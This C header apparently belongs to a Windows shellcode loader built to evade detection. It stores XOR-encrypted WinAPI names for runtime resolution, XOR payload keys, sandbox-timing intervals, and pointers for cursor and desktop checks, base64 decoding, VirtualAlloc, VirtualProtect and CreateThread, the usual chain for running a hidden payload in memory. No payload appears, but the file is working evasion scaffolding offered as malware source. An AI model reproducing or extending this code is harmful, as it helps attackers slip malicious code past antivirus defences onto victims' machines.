/// This files contains all relevant definitions, PPDs and Globals 
#include <Windows.h>
#pragma once

/// User defined PPDs
#define L_INTERVAL  950    // Lower Time Limit
#define INTERVAL    1000   // Mean  Time Limit
#define U_INTERVAL  1050   // Upper Time Limit

/// Globals
// Handles to DLLs
HMODULE _kernel32, _user32, _crypt32;
// XOR Payload key
const char XOR_KEY[] = "abcdefghijklmnopqrstuvwxyz";
// Length of XOR key
unsigned int xor_key_len = (int)(sizeof(XOR_KEY)/sizeof(XOR_KEY[0]))-1;
// XOR Function Key
const char XOR_FUNC_KEY[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
// Length of XOR Func key
unsigned int xor_func_key_len = (int)(sizeof(XOR_KEY)/sizeof(XOR_KEY[0]))-1;

/// WinAPI function signatures
BOOL (WINAPI * _GetTickCount)();
void (WINAPI * _Sleep)(DWORD dwMilliseconds);
HDESK (WINAPI * _OpenInputDesktop)(DWORD dwFlags, BOOL fInherit, ACCESS_MASK dwDesiredAccess);
BOOL (WINAPI * _SetThreadDesktop)(HDESK hDesktop);
BOOL (WINAPI * _GetCursorPos)(LPPOINT lpPoint);
BOOL (WINAPI * _CryptStringToBinaryA)(LPCSTR pszString, DWORD  cchString, DWORD  dwFlags, BYTE   *pbBinary, DWORD  *pcbBinary, DWORD  *pdwSkip, DWORD  *pdwFlags);
LPVOID (WINAPI * _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
BOOL (WINAPI * _VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
HANDLE (WINAPI * _CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * _WaitForSingleObject)(HANDLE hHandle, DWORD  dwMilliseconds);

/// Typedefs
typedef BOOL (__stdcall * __type_gettickcount)();
typedef void (__stdcall * __type_sleep)(DWORD dwMilliseconds);
typedef HDESK (__stdcall * __type_openinputdesktop)(DWORD dwFlags, BOOL fInherit, ACCESS_MASK dwDesiredAccess);
typedef BOOL (__stdcall * __type_setthreaddesktop)(HDESK hDesktop);
typedef BOOL (__stdcall * __type_getcursorpos)(LPPOINT lpPoint);
typedef BOOL (__stdcall * __type_cryptstringtobinarya)(LPCSTR pszString, DWORD  cchString, DWORD  dwFlags, BYTE   *pbBinary, DWORD  *pcbBinary, DWORD  *pdwSkip, DWORD  *pdwFlags);
typedef LPVOID (__stdcall * __type_virtualalloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL (__stdcall * __type_virtualprotect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (__stdcall * __type_createthread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (__stdcall * __type_waitforsingleobject)(HANDLE hHandle, DWORD  dwMilliseconds);

/// Encrypted WinAPI function names
/// Use xor_func_name() function from `scripts/obfuscator.py`
unsigned char __gettickcount[] = {0x06, 0x27, 0x37, 0x10, 0x2c, 0x25, 0x2c, 0x0b, 0x26, 0x3f, 0x25, 0x38, 0x0};
unsigned char __sleep[] = {0x12, 0x2e, 0x26, 0x21, 0x35, 0x00};
unsigned char __openinputdesktop[] = {0x0e, 0x32, 0x26, 0x2a, 0x0c, 0x28, 0x37, 0x3d, 0x3d, 0x0e, 0x2e, 0x3f, 0x26, 0x3a, 0x20, 0x20, 0x00};
unsigned char __setthreaddesktop[] = {0x12, 0x27, 0x37, 0x10, 0x2d, 0x34, 0x22, 0x29, 0x2d, 0x0e, 0x2e, 0x3f, 0x26, 0x3a, 0x20, 0x20, 0x00};
unsigned char __getcursorpos[] = {0x06, 0x27, 0x37, 0x07, 0x30, 0x34, 0x34, 0x27, 0x3b, 0x1a, 0x24, 0x3f, 0x00 };
unsigned char __cryptstringtobinarya[] = {0x02, 0x30, 0x3a, 0x34, 0x31, 0x15, 0x33, 0x3a, 0x20, 0x24, 0x2c, 0x18, 0x22, 0x0c, 0x26, 0x3e, 0x30, 0x20, 0x2a, 0x15, 0x00 };
unsigned char __virtualalloc[] = {0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x09, 0x25, 0x26, 0x24, 0x2f, 0x00 };
unsigned char __virtualprotect[] = {0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x18, 0x3b, 0x25, 0x3f, 0x29, 0x2e, 0x3a, 0x00 };
unsigned char __createthread[] = {0x02, 0x30, 0x26, 0x25, 0x31, 0x23, 0x13, 0x20, 0x3b, 0x2f, 0x2a, 0x28, 0x00 };
unsigned char __waitforsingleobject[] = {0x16, 0x23, 0x2a, 0x30, 0x03, 0x29, 0x35, 0x1b, 0x20, 0x24, 0x2c, 0x20, 0x28, 0x01, 0x2d, 0x3a, 0x34, 0x31, 0x27, 0x00 };